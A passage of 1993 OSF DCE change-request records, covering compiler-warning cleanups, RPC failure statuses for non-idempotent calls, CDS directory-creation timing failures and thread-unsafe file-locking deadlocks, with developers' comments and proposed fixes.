Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : secd
Short Description             : Need capability to allow specific principal(s) access to UNIX passwd
Reported Date                 : 9/10/93
Found in Baseline             : 1.0.2
Found Date                    : 9/10/93
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/10/93 public]

When the passwd_export command is executed, the UNIX password is NOT
obtained unless the registry policy for passwords is set such that
they are visible. This is a major handicap for administrators who
need to periodically synchronize their local database with the DCE registry. 

This can very easily be fixed by adding a new permission type to the policy
ACL manager, which when set will give the UNIX encrypted password to the
requesting client. 
For passw_export

[9/10/93 public]
Changed fixby to 1.1, since 1.0.3 is only a bugfix release, and this is
definitely new functionality that we couldn't even consider adding until 1.1
Changed short description so summary reports will be more accurate
(previous desc said passwd_export couldn't get Unix passwd, which it can
if the policy is set right, so there's nothing wrong with the utility itself)



CR Number                     : 8573
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dts
Subcomponent Name             : 
Short Description             : compiler warnings (ints compared with unsints)
Reported Date                 : 9/8/93
Found in Baseline             : 1.0.3
Found Date                    : 9/8/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : time/common/dpeaclaccess.c,tzset.cc,utcapi.c
Sensitivity                   : public

[9/8/93 public]

at lines 351 and 359 in file time/common/dpeaclaccess.c, there are
for loop contriol stuctures of the form 

for (j = 0; (j < accessor_info->num_groups); j++)

and 

for (j = 0; (j < accessor_info->num_foreign_groups); j++)

the test expressions in these loop control expressions attemp to
compare a signed loop counter variable, j, with an unsigned variable;
either accessor_info->num_groups or accessor_info->num_foreign_groups.

The compilation of this implementation produces compiler warnings which 
should be eliminated by changing the declaration of the loop counter
variable, j, to be of the appropriate unsigned type.

------------------

at line 327 of file time/common/tzset.c a comparison is made between
an unsigned char and an integer. the result is a compiler warning which 
should be eliminated.

	if (lclstate.types[i] >= lclstate.typecnt)

The compiler complains because it assumes that
the positive precision of an unsigned container may exceed that of an
integer, regardless of our general assumptions about the relative precision
of characters and integers. Although one would be tempted to employ a cast
to silence the compiler the more correct, although also more tedious,
method of correcting this situation would either be to change the type of 
the integer to unsigned or the type of the unsigned to an integer. 

-----------------

at line 981 of file time/common/utcapi.c the following expression was
reported to have resulted in a compiler warning. Iwas not able to
demonstrate this to be the case, although the fact that the litlle endian
case of the same instruction has been modified with a cast, is evidence
tht someone else saw the same warning in the little endian case.

#ifdef BIG_ENDIAN_ARCHITECTURE
    if (((autc.endian.big.flags & VERSION_MASK) >> VERSION_SHIFT) !=
	K_BINTIME_VERSION)

since autc.endian.big.flags is typed to be an unsigned char, I suspect that
their compiler is complaining that the expression derived form flags is
incompatible with the constant K_BINTIME_VERSION, which is treated as an
the integer value 1. Their compiler should probably be sophisticated enough
to deal with this situation since the integer is a positive constant. In
any case however, we should change the code to be consistent in the big and
little endian cases. I suspect that casting the definition of the
constant K_BINTIME_VERSION to an unisgned is probably the correct thing to
do (also remove the cast from the little endian case).



CR Number                     : 8557
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : cds
Subcomponent Name             : 
Short Description             : compiler warnings in cds library
Reported Date                 : 9/3/93
Found in Baseline             : 1.0.1
Found Date                    : 9/3/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : files directory/cds/library
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/3/93 public]

Full Description

the following compiler warnings were encountered in in cds library code
on FTX 2.2 (Fault Tolerant version of UNIX SVR4) OSF builds are not
presently producing such warnings, even though the reported type
incompatiblilities do exist in the code, and according to
ANSI-C a "high quality implementation might do well" to offer optional
diagnostics" in such cases

-----------------------

     cds_events.c
     ------------
     At line 286:

     if ( strlen(text_buffer)+1 > evp->strings_len )

     SOLUTION: change the type of evp->strings_len to size_t.

     At line 305:

     if ( strlen(log_buffer)+1 > evp->syslog_len )

     SOLUTION: change the type of evp->syslog_len to size_t.

     deb_event_mgr.c
     ---------------

     At line 1322:

     assert(strlen(name_p) < nameLen);

     SOLUTION: change the type of nameLen to size_t

     dnscmpsimple.c
     --------------
     At line 160:

     if (length > EXT8(tsn2.sn_length))

     SOLUTION: change logic and expression to

            if (EXT8(tsn1.sn_length) > EXT8(tsn2.sn_length))
	        length = EXT8(tsn2.sn_length);
            else length = EXT8(tsn1.sn_length);

     dpeaclaccess.c
     --------------
     At line 354:

     At line 362:

     for (j = 0; (j < accessor_info->num_groups); j++)

     for (j = 0; (j < accessor_info->num_foreign_groups); j++)

     SOLUTION: in both cases, change the type of j to an unsigned
               type compartible with num_groups or num_foreign_groups

     formatts.c
     ----------
     At line 245:

     if (strlen(timestr) > stringlen)

     SOLUTION: the value of stringlen is acquired by an involved
               process which employs functions which want stringlen
               to be an int. therefore declare a new variable of
               type size_t and assign the value of stringlen to
               it and use it in the comparison.

     rpc_cvt.c
     ---------
     At line 1746:

     for (i = 0; i < data->set_length; i++) {

     SOLUTION: change the type of i to an unsigned

     tower_lib.c
     -----------

     At line 644:

     if ( !(*binding_p = malloc(asize)))

[09/03/93 public]
{It looks like some comment is missing about the malloc, above.}

I think in almost all cases a better solution is to use a cast.  Obvious
exceptions are the three for loops.  For example, adding a local var for
this is clearly wrong:
     if (strlen(timestr) > stringlen)
rewrite it as
	if (strlen(timestr) > (size_t)stringlen)

[09/03/93 public]

I surrender that my local variable idea was poorly considered, although
I think the cast is a mistake. Assuming strlen to be an immovable object,
either stringlen should change, or leave the compiler warning as a clue
should the program develop some unexpected behavior. 

the malloc line didn't include a proposed solution, it should be
interpretted as this line causes a compiler warning.

I was going to suggest something like the following, but judging by 
your reaction to the strlen example, I shudder to think what you'll
say about this.

               void *p;
               p = malloc(asize);
               if (!(*binding_p = p)

[09/07/93 public]
The thing that is missing from the "malloc" line is the compiler complaint;
I don't know what fix to recommend without seeing the real "warning."
At any rate, one proper way to write the "if" line is like this:
	if ((binding_p = (type_of_binding *)malloc(asize)) == NULL)
where "type_of_binding *binding_p;" or something like it is the declaration.
Using ! to test pointers for validity is legal, but gross.

The fact that strlen() now returns size_t which on some platforms can
be an unsigned collides with the fact that ANSI changed the way signed
and unsigned comparisons are done.  A local variable is the wrong thing
to do; a cast has the exact same semantics as a local variable (K&R 2nd
ed p45) and arguably "fixes" the "problem."

Looking back, I'm surprised that I made any comments originally, without
seeing the real text of the error message.  We should require the real
text on any future reports.

[09/08/93 public]

I requested that the submitter include the warning text with such
problem reports.

The original service call also included the following problems
which I originally decided to omit from this OT. The submitter has
insisted, that they be included, so here they are.

     deb_event_mgr.c
     ---------------
     At lines 484 and 749:

     if (strlen(deb_global_event) > 0) {

     proposed solution: use either of the following

	if (strlen(deb_global_event)) {
	if (strlen(deb_global_event) > (size_t) 0) {

     triggers_lib.c
     --------------
     At lines 492 and 545:

     if (strlen(name) > 0) {

        proposed solution: use either of the following

        if (strlen(name)) {
        if (strlen(name) > (size_t) 0) {

[09/09/93 public]
The submittor's compiler is wrong to be complaining about
	if (strlen(xxx) > 0)

Nevertheless this is a much better test:
	if (xxx[0])



CR Number                     : 8555
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : idl compiler
Short Description             : stub epvs generated by idl not const
Reported Date                 : 9/3/93
Found in Baseline             : 1.0.2
Found Date                    : 9/3/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/3/93 public]

Full Description:
        The epvs ( entry point vectors ) and other static data
( that does not change ) should be declared as 'const'. This will
prevent applications from accidentally writing into stub data.



CR Number                     : 8537
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : non reachable return statement
Reported Date                 : 8/30/93
Found in Baseline             : 1.0.2
Found Date                    : 8/30/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/30/93 public]

	cds/control/attrname_actions_cds.c at line 489 (end of function
savecdsattr()):

	return(ACT_ERROR);

     can never be reached.  Therefore, it produces a warning saying statement
     not reached.  It should probably be removed.



CR Number                     : 8536
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : cds
Subcomponent Name             : 
Short Description             : Warnings indicating possible
error in converting signed to unsigned
Reported Date                 : 8/30/93
Found in Baseline             : 1.0.2
Found Date                    : 8/30/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/30/93 public]

ANSI C compilers give warnings when it sees an operation which involves a
signed operand and an unsigned operand. By definition, the compiler will 
convert the signed into unsigned and then perform the operation. During the
conversion, there is possibility that a negative signed value may be
converted into a big positive unsigned number. hence the warning.

Generally we look at the code to see whether it is really a problem in each
case. If it turns out not to be a problem, we can later turn off the
warning from the compiler.

Here is a case where it is hard to determine whether the error could
happen:

In cds/includes/server.h (around line 278):

#define INDEX_DBSet(ptr,idx) ((NUM_DBSet(ptr) <= idx) ? SKIP_DBSet(ptr) : \

where idx is signed, NUM_DBSet(ptr) is unsigned. Whether it may have a
problem depends on the value of idx, but it is hard to judge here.

So we can either go through every occurrence of INDEX_DBSet to make sure
that idx is always positive, or we can make the following change:

#define INDEX_DBSet(ptr,idx) (((int)(NUM_DBSet(ptr)) <= idx) ? SKIP_DBSet(ptr) : \


Another place:

     clerk_client.c
     --------------
          At line 692 in function parse_arguments():

          if (((i -= MIN_optab) < 0) || (MAX_optab < i))

Since int i = EXT8(th_p->clerkReq.op), if for any reason th_p or
th_p->clerkReq is not intialized right, i may be a negative number. In that
case, when (i -= MIN_optab) is perform, i would be converted to unsigned
and an error would happen.

	We can fix it as follows:

        if (((i -= (int)MIN_optab) < 0) || ((int)MAX_optab < i))

[09/28/93 public]
ANSI C comliance is scheduled as part of code cleanup requirements during
1.1.



CR Number                     : 8528
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : client runtime should use
state info in comm error conditions
Reported Date                 : 8/29/93
Found in Baseline             : 1.0.2
Found Date                    : 8/29/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/29/93 public]

For non-idempotent calls, different error codes (exceptions) should be 
used once the server may have started the call thread.

In cn, the call packet is sent after the bind is complete.  Thus a 
communications failure (e.g. connection closed) after the call packet has
been sent should report a different error than a communications failure
during the bind.

In dg, (I believe) the cthread is not dispatched until the WAY processing 
completes.  Thus, if the client times out without receiving the WAY
callback, a different error should be raised than when the call fails after
the WAY callback is acknowleged.

This would be a big plus to application writers, since the application
would know when to retry a call (server didn't start cthread) and when 
cleanup might be required on the server end.

[9/30/93 public]

I agree that this would be useful information to make available to the 
application.  

Currently, the SPI contains a call (rpc_call_did_mgr_execute) which
the stubs can use to determine if it's safe to retry a call.  (The stubs
use this call during the processing of an auto handle.)

It would not be possible to make the current mechanism available to
applications (it requires the call handle), but the information is in 
there.

[10/8/93  public]


What is the status on this CR.  It seems to be an important
issue to me.  Is there a chance that this might be fixed in 
1.0.3 ?

Gerry Thome
IBM-Austin

[10/13/93 public]
This will not be fixed in 1.0.3.  I am defering it to 1.1.
The work involved seems substantial.
More info from Mark:

Well, as I said in the CR, the information that you're after is 
already in there.  It's just a matter of figuring out how to get
it to the application.

The problem is that, unlike call handles, binding handles can be
shared, so it's not as easy as just sticking the status into the
binding handle and adding a call like rpc_binding_did_mgr_execute().

One solution would be to store the status into thread-specific 
storage associated with the binding handle.  This would be 
expensive, and it seems bad that the application  would be
forced to make an extra call per rpc to retrieve this information.

Another idea would be to have the status returned through a status
parameter, in the way that [comm status] and [fault status] are
currently handled.  Unfortunately, unlike fault and comm statuses,
this one cannot be overlaid onto a single status parameter, since
you don't want to lose the information about *why* the manager
didn't execute.

A compromise solution might be to allow the ACF file to specify that
the status information should be stored in per thread storage 
associated with the binding handle.

- Mark

[10/15/93 public]

One serious problem app developers face now is the inability to retry
non-idempotent calls upon receiving rpc_x_comm_failure.  Since there
is no indication whether the call failed due to something like a network
outage during the manager execution (don't retry) or before manager
execution (retry) the app writer must take the safe route and just fail.
My experience in using client server apps, is the vast majority of failed
executions occur because of network or server outages existing at the 
time of the call. Thus, most non-idempotent call failures could be retried
either on a different binding (network or server) or periodically on
the same binding. 


I (probably naively) think there are only two or three status/exceptions
involved: rpc_x_comm_failure, rpc_x_connection_closed, and, maybe, 
rpc_x_connection_aborted.  After noting Mark's comment about not losing
server manager failure info, I'd like to propose this: 
1. Add the did_mgr_execute call to the stubs for non-idempotent calls.
2. If the status returned from the call is one of the above, test
   the call handle with did_mgr_execute. 
3. If the response is "no", raise something like rpc_x_comm_failure_no_ex.
   Otherwise, raise the original exception.

Could we take another look at getting this into 1.0.3?

[10/20/93 public]

PROPOSED FIX for 8528

This will be submitted today.

The basic idea is to use the rpc_call_did_mgr_execute during
rpc_ss_call_end_2 to convert certain result statuses in the
case when the manager is known to not have executed.

I liked Mark's notion of adding an acf tag similar to comm_status,
but took this route instead:

  Error handling encapsulation will be *always* be used, so adding
  some new statuses shouldn't hurt too much now.

  I suspect most app writers still haven't caught on to the new load
  of cn exceptions, so we can get them up to speed all at once via
  1.0.3 rel notes.

  This check must be made before retrying non-idempotent rpc failures.
  That is, apps that are retrying on comm_failure are broken now and
  should be fixed.

  This change involves functional changes to one routine 
  (rpc/idl/lib/sscmaset.rpc_ss_call_end_2).  The acf changes were not
  feasible in the 1.0.3 timeframe.

  This change minimizes app changes.  The only way I could come up
  with to use another acf attribute would be to add a boolean argument
  to each rpc and mark it with the new attribute.

The changes were based on and sniff tested (dg only) against dce1.0.3ib7.

New statuses/exceptions returned when manager did not execute:
  rpc_s_comm_failure_before_mgr (in case of rpc_s_comm_failure)
  rpc_s_conn_closed_before_mgr (in case of rpc_s_connection_closed)
  rpc_s_conn_aborted_before_mgr (in case of rpc_s_connection_aborted)


LIBIDL Changes

  rpc/idl/lib/sscmaset.c
    Add exception definition and init for
      rpc_x_comm_failure_before_mgr
      rpc_x_conn_closed_before_mgr
      rpc_x_conn_aborted_before_mgr

  Modify rpc_ss_raise_impl_exception() 
    Add result code to exception mappings for
      rpc_x_comm_failure_before_mgr
      rpc_x_conn_closed_before_mgr
      rpc_x_conn_aborted_before_mgr

  Modify rpc_ss_call_end_2()
    If call handle is valid,
      If call has error status and rpc_call_did_mgr_execute returns false,
        rpc_s_comm_failure      -> rpc_s_comm_failure_before_mgr
        rpc_s_connection_closed -> rpc_s_conn_closed_before_mgr
        rpc_s_connection_aborted-> rpc_s_conn_aborted_before_mgr


SYS IDL Changes

rpc/sys_idl/rpc.msg
  Add new messages to end 

rpc/sys_idl/rpcexc.h
  Add
    rpc_x_comm_failure_before_mgr
    rpc_x_conn_closed_before_mgr
    rpc_x_conn_aborted_before_mgr


LIBDCE
  New symbols exported from libdce.a
    rpc_x_comm_failure_before_mgr
    rpc_x_conn_closed_before_mgr
    rpc_x_conn_aborted_before_mgr



TESTCASES Changes
  Look for specific checks/catches of 
        rpc_[sx]_comm_failure
        rpc_[sx]_connection_closed
        rpc_[sx]_connection_aborted
 
 The only instance I can think of is the print_exception routine in the 
 idl backend tests.


DOCS/RELNOTES

Add new statuses to retry list.
Add rpc_s_rpcd_comm_failure to retry list?
Don't retry non-idempotent rpcs on 
  rpc_s_comm_failure
  rpc_s_connection_closed
  rpc_s_connection_aborted
  (rpc_s_connect_closed_by_rem??)


CAVEATS
  Status convervsion still takes place on calls made on a context handle.
  There may be other cn statuses that should be converted, 
    e.g. rpc_s_connect_closed_by_rem.

Bob Hathaway told Scott Page to add some doc info in the release notes,
as the doc changes probably won't happen.

Gerry Thome for Scott Page

[10/20/93 public]

If this change is made, we'll need to make a few changes over in rebind
code in security (internal_binding.c:rca_retry_status() and probably in a
couple of other places); I suspect other components (DFS's ubik package?
CDS?) will need to make changes as well.

[10/20/93 public]
A quick grep through the 1.0.3 sources shows 55 files which reference
rpc_s_comm_failure:

component:				refs	need change?
	cds				 2	2
	file				24	7
	rpc				 9	?
	security			 5	4
	test/rpc			 5	?
	test/systest			 4	?
	nosupport			 5	?
	time				 1	?

I looked at the files turned up by the grep in cds, file, and security, to
come up with the "need change" column.  This leads me to guestimate that
roughly 20 files would have to be changed to deal with the new _before_mgr
status codes.

Note while many of these places are ones which don't deal with the full
range of CN return codes (and thus wouldn't be broken significantly worse
than now), at least one place in each of component I looked at either
already did the right thing for CN or only had to deal with DG in the first
place.  I can guarantee that the status code change will be likely to break
security server rebinding; you can show this by running a multi-server cell
with one of the security servers taken off line (by kill -9 or the big red
switch).

[10/25/93 public]
There has been lots of email discussion on this.  I want to capture some of
that discussion here.

An alternative proposal has been to add a new attribute to join the
comm_status and fault_status family; something like server_status that
can be used to indicate if the server got the RPC, didn't get it,
don't know, etc.

From email by Bill Sommerfeld:
Basically, I'd like to see things so that the remote call wrappers
found in security (which has a bunch of macros which loop calling the
client stub with different handles in succession until it works) or in
DFS (which has the same thing open-coded in a couple of different
places, both in the CM and in ubik) can be done *in* the client
stubs/libidl with a callback to the application to provide
 - "should we keep going anyway"?
 - "here's the next handle" (with any rpc_binding_set_auth_info() or
other "conditioning" done to it by the application code).

There was the old bind/unbind stuff in the old NCS1.5.x IDL which
apparantly got dropped in the DCE IDL (in favor of context handles).
I think the programming "flavor" that you want is that you supply a
user-defined type which the stub passes to a callback routine to
extract a handle or handles; after the call, you call a second
user-supplied callback routine to decide whether the call succeeded or
failed at an "application" layer, and the information from the RPC can
be provided there..



CR Number                     : 8527
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : cn runtime
Short Description             : cn ignores binding
comm_timeout during tcp connect
Reported Date                 : 8/29/93
Found in Baseline             : 1.0.2
Found Date                    : 8/29/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/29/93 public]

cn rpc should observe the binding comm timeout value when attempting
to connect to a server (as a maximum time to wait before canceling an
unsuccessful connect).  Typically, tcp provides something like a 75
second timeout to try and connect to a remote socket.  There are some
number of circumstances (e.g., recent remote host death) that result in
cn rpc waiting this full timeout instead of quitting after the specified
comm timeout.

This is similar to OT 8224 which addresses timeouts after a connect
is successful, but the bind fails.

This seems like an unecessary difference between cn and dg rpc semantics.

[8/19/94 public]
This is an enhancement.



CR Number                     : 8522
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : gdad
Short Description             : gdad should use resolver functions
Reported Date                 : 8/27/93
Found in Baseline             : 1.0.2
Found Date                    : 8/27/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/27/93 public]
gdad constructs BIND name resolution queries, then uses sendto() and
recvfrom() to interact with named.  It would be much better to provide
wrappers for BSD 4.x resolver routines res_mkquery(), ... and use these.
The result would be a smaller gdad with less likelihood of errors.



CR Number                     : 8504
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : 
Short Description             : EINTR handling in CMA
Reported Date                 : 8/24/93
Found in Baseline             : 1.0.2
Found Date                    : 8/24/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/24/93 public]

CMA does not retry when sys calls return -1 with error code set to EINTR.
Instead, an error is returned to the user application.

This happens mostly to the cma jacket routine (for SVR4, it also happens to
fcntl and fstat which CMA uses directly. But the problem with fcntl and
fstat is SVR4 specific). 

The comments from cma__ts_open() in cma_thread_io.h:

     * FIX-ME: for the time being, if the I/O operation returns EINTR, we
     *      simply return it to the caller; eventually, we should catch this
     *      and "do the right thing" (if we can figure out what that is).

suggests that EINTR should be caught.

This OT is opened so that we don't forget this issue.



CR Number                     : 8503
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : idl
Short Description             : Add a means for the user to
control server failure behavior
Reported Date                 : 8/24/93
Found in Baseline             : 1.0.3
Found Date                    : 8/24/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/24/93 public]
Add a facility whereby the user can control the behavior of a server after
an exception has occurred.
The present functionality is that the exception is propagated back to the
client and the server continues running.
Add an ACF attribute [server_action(abort)]. If the server stub is
compiled with this attribute, when the server stub catches an exception
which is not identifiable as having been caused by a communications error
it will cause the server to abort.



CR Number                     : 8502
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : mx300
S/W Ref Platform              : sinix
Component Name                : cds
Subcomponent Name             : 
Short Description             : Sometimes cannot create directory
in second clearinghouse from client machine
Reported Date                 : 8/24/93
Found in Baseline             : 1.0.2
Found Date                    : 7/27/93
Severity                      : B
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/24/93 public]

I have a two machine cell, with one machine running all of the servers and
one machine acting as a client.  On the client machine, I run the following
script as cell_admin:

	#!/bin/sh
	cdscp <<EOF
	create directory /.../houdini.cells.sni-usa.com/root1127ben2
	set directory /.../houdini.cells.sni-usa.com/root1127ben2 to skulk
	create directory /.../houdini.cells.sni-usa.com/root1127ben2/testdir
	set directory /.../houdini.cells.sni-usa.com/root1127ben2/testdir to skulk
	set directory /.../houdini.cells.sni-usa.com/root1127ben2/testdir to new epoch master /.../houdini.cells.sni-usa.com/houdini_ch
	create directory /.../houdini.cells.sni-usa.com/root1127ben2/testdir_clearinghouse1 clearinghouse /.../houdini.cells.sni-usa.com/houdini_ch
	create directory /.../houdini.cells.sni-usa.com/root1127ben2/testdir_clearinghouse2 clearinghouse /.../houdini.cells.sni-usa.com/second_ch
	EOF

Sometimes, on the last command, I get:

    Error on entity: /.../houdini.cells.sni-usa.com/root1127ben2/testdir_clearinghouse2
    Unable to communicate with any CDS server (dce / cds)
    Function: dnsCreateDir


This is not consistent, and sometimes the script works.  Whether or not
the script works is very timing dependent.  On slower machines, it almost
always works, on faster machines, it almost never works.   If I try
the same commands by hand it always works.  

Any cdscp commands that I try by hand on the second clearinghouse all work,
so I don't think that there is any problem inherent in the second clearinghouse.



CR Number                     : 8495
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : osf1
Component Name                : thr
Subcomponent Name             : flock/fcntl
Short Description             : Use of non-thread safe file
locking calls in the security code may be causing process deadlock.
Reported Date                 : 8/20/93
Found in Baseline             : 1.0.2
Found Date                    : 8/20/93
Severity                      : A
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/20/93 public]

The DME development group using dce1.0.2 code have run into process
deadlock under the following scenario. This is probably caused by the use
of non-thread safe file locking calls (flock or fcntl) in the security
code. The current threads package has a wrapper for fcntl call, but does 
not provide file locking operations. This particular call is in the 
fcc_maybe.c file. It may require to be wrapped with either a mutex or a 
global lock. Here is the info from the DME developer.
----------------------------------------------------------------------
I have a multithread client wherein many of the threads
are doing RPC's using the same sec_login_handle_t. (ie, calling
rpc_binding_set_auth_info() with ptrs to the same
sec_login_handle_t).  Is this OK?

I see strange behaviour in this process including a "hang" with
rpc_binding_set_auth_info().  The process is stuck in an flock(),
here is the stack of one of the stuck threads,  I don't know
how to view the stacks of the other CMA threads in gdb....

#0  0xa403fb18 in flock ()
#1  0xa43c154c in fcc_lock_file (8457480, 24, 0)
#2  0xa43c17ab in krb5_fcc_open_fileOB (10150528, 2)
#3  0xa43c3128 in krb5_fcc_store (10150528, 10156200)
#4  0xa43c9ce7 in krb5_get_credentials (16, 10150528, 10156200)
#5  0xa42fecf2 in sec_krb_get_cred (5346984, 10478640, 5, 2, 10304520,
7863104)
#6  0xa4228157 in rpc__krb_get_tkt (10304440)
#7  0xa42285f7 in rpc__krb_bnd_set_auth
    (10269176, 5, 5346984, 2, 10157736, 7863200, 7863612)
#8  0xa41cff49 in rpc_binding_set_auth_info
    (10157736, 10269176, 5, 1, 5346984, 2, 7863612)
#9  0x4093c7 in evs_i_erb_rpc_forward (p_forward_buf=0x9b28b8, 
    p_thread_data=0x4ed914, p_login_context=0x518f34, p_status=0x77fe10)
    at ../../../../../src/services/evs/evs_erb/erb_rpc.c:196
#10 0x403053 in evs_i_erb_emit_thrd_main (emit_thrd_id_arg=0xd)
    at ../../../../../src/services/evs/evs_erb/erb_emit_thrd.c:116
#11 0xa41c2063 in cma__thread_base ()
#12 0xa41cd685 in cma__create_thread ()
#13 0x402f48 in evs_i_erb_emit_thrd_main (Cannot access memory at address
0xd.

[10/7/93 public]
This should be fixed with thread-safe wrappers for flock and fcntl.
Changed component to threads, owner to John Dugas.

[jd 10/15/93 public] 
The original proposed solution to this was to make fcntl block only
the calling thread while waiting for the file lock but as it turns out
there are other problems. The lock obtained from fcntl is a process 
resource. That is two threads in the same process asking for a lock on
the same file will both succeed. The kernel checks the process id
against that of the owner and if its the same it returns success. Just
making the call a thread blocking rather than a process blocking call
will not solve this and in fact could exasperate the problem.
What's required is a full implementation of a thread safe the file locking 
capability in  cma on top of the existing fcntl functionality. We have
looked at the feasability of this and determined that it is doable but not
in the exiting time frame. We are therefore defering this and will
implement the full functionality in 1.1. The secuurity problem that triped
across this is being fixed with suitable mutexes to safeguard critical
file access.

[10/15/93 public]
Realistically this is an enhancement request for an np extension to
fcntl to make the lock a thread resource. It WILL be done in 1.1
as an enhancement.



CR Number                     : 8494
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : osf1
Component Name                : thr
Subcomponent Name             : 
Short Description             : Caching of vp's and stacks does not work properly when Mach threads are used
Reported Date                 : 8/20/93
Found in Baseline             : 1.0.2
Found Date                    : 8/20/93
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : threads/cma_vp_defs.h,cma_stack.h,cma_vp.h,cma_tcb.h,cma_stack.c,cma_tcb.c,cma_thread.c,cma_dispatch.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/20/93 public]

Full Description:

 Disclaimer: I have accepted this as is from the submitter, use at
             your own risk.

Full Description:

 The DCE threads code tries to be clever about how it uses vp's and
 stacks.  Rather than reallocating these resources, it caches them when
 a thread exits.  This is a good idea in principle, but requires
 considerable care to ensure that a resource is not re-used until
 nobody else is using it.
 
 Problems:
 
 1)  Stacks may not be re-used until the last user has been restarted
 (on a different stack).  This is because the thread_suspend call is
 going to return status to the last stack it knew about, not the one
 it's now supposed to be using.  My solution was to record the stack in
 the vpid structure and, when the thread is re-used, it frees the stack
 it used the last time.
 
 2)  VP's may not be casually re-used.  In particular, just because the
 user level code has decided that it is done with the VP, that VP may
 still be running in the kernel (not suspended yet).  It's necessary to
 check the thread's status with the kernel to ensure that it has truly
 stopped. 

Proposed Solution:
 
src/threads/cma_vp_defs.h
 added stack field to cma__t_vpid struct.

src/threads/cma_stack.h
 added prototype for cma__stack_preserve function.

src/threads/cma_vp.h
 added prototype for cma__vp_cache_vpid.

src/threads/cma_tcb.h
 added second parameter (destroy) to cma__free_tcb prototype.

src/threads/cma_stack.c
 added cma__stack_preserve routine.

src/threads/cma_tcb.c
 added call to vp_cache_vpid in destroy_tcb, added second
 parameter to free_tcb, added asserts checking for bad queue
